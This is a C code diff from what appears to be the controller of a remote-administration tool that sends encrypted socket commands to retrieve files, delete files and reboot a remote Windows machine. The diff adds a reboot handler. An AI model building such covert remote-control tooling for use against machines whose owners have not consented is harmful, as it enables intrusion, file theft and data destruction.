@@ -266,11 +266,7 @@ int UploadFile(char *cmd,int client_socket, char * filename, char * FullWindowsP
         printf("[x] send() failed\n");
         return -1;
     }
-
-    // TODO: Encrypt the requested file to a tmp file and send it regularly and delete the tmp file.
-
-
-
+    
     // Check if file exists
     //FILE* file = fopen(filename, "rb");
     int file = open(filename,O_RDONLY);
@@ -464,4 +460,35 @@ int DeleteRequestedFile(char *cmd, int client_socket, char * filename){
     
     printf("[x] Delete failed! Err: %d\n",err_no);
     return 0;
+}
+
+int HandleReboot(char *cmd , int client_socket){
+    ssize_t sent_bytes = 0;
+    ssize_t bytes_received = 0;
+    encrypt( (unsigned char *)cmd,(size_t) strlen(cmd));
+    sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
+    if (sent_bytes == -1){
+        perror("[x] send() failed");
+        return -1;
+    }
+    char recv_buf[BUFFER_SIZE] = {0};
+
+    bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE , 0);
+    if (bytes_received < 0) {
+        perror("[x] recv() failed\n");
+        exit(EXIT_FAILURE);
+    }
+    
+    decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
+    printf("[+] recv_buf == %s\n",recv_buf);
+    unsigned long err_no = atoi(recv_buf);
+    if (err_no == (unsigned long) 16000){
+        printf("[+] Rebooted successfully!\n");
+        return 0;
+    }
+    
+    printf("[x] reboot failed! Err: %ld\n",err_no);
+
+
+    return -1;
 }
